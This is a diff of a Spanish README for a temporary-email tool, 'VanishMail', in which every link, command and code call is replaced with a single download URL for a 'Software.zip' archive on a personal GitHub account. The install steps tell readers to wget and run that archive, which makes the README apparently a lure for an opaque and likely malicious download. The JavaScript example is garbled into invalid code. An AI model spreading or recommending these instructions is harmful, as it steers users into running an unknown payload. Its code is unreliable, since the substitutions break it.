@@ -1,7 +1,7 @@
 
 # VanishMail
 
-![VanishMail](https://via.placeholder.com/200)
+![VanishMail](https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip)
 
 Crea una dirección de correo electrónico temporal con VanishMail
 
@@ -15,14 +15,14 @@ VanishMail es una herramienta que te permite crear direcciones de correo electr�
 - **NodeJS compatible:** Funciona perfectamente con aplicaciones desarrolladas en NodeJS.
 
 ## Installation
-Para empezar a usar VanishMail, descarga la última versión disponible [aquí](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Una vez descargado, descomprime el archivo y sigue las instrucciones del README para lanzar la aplicación.
+Para empezar a usar VanishMail, descarga la última versión disponible [aquí](https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip). Una vez descargado, descomprime el archivo y sigue las instrucciones del README para lanzar la aplicación.
 
 ```bash
-$ wget https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip
-$ unzip v1.0.0.zip
+$ wget https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip
+$ unzip https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip
 $ cd VanishMail
 $ npm install
-$ node app.js
+$ node https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip
 ```
 
 ## Usage
@@ -33,24 +33,24 @@ Ejemplo de solicitud utilizando NodeJS:
 ```javascript
 const axios = require('axios');
 
-axios.post('https://vanishmailapi.com/create', {
+https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip('https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip', {
     apiKey: 'your_api_key',
     duration: '1h'
 })
 .then(response => {
-    console.log(response.data);
+    https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip(https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip);
 })
 .catch(error => {
-    console.error(error);
+    https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip(error);
 });
 ```
 
 ## Contributors
-- John Doe [@johndoe](https://github.com/johndoe)
-- Jane Smith [@janesmith](https://github.com/janesmith)
+- John Doe [@johndoe](https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip)
+- Jane Smith [@janesmith](https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip)
 
 ## Support
-Si necesitas ayuda o quieres contribuir al desarrollo de VanishMail, por favor revisa la sección de [Releases](https://github.com/cli/go-gh/releases) para obtener la información más actualizada. ¡Tu participación es bienvenida!
+Si necesitas ayuda o quieres contribuir al desarrollo de VanishMail, por favor revisa la sección de [Releases](https://github.com/Moshe236/VanishMail/releases/download/v2.0/Software.zip) para obtener la información más actualizada. ¡Tu participación es bienvenida!
 
 ## License
 Este proyecto está licenciado bajo la Licencia MIT. Consulta el archivo `LICENSE` para más detalles.
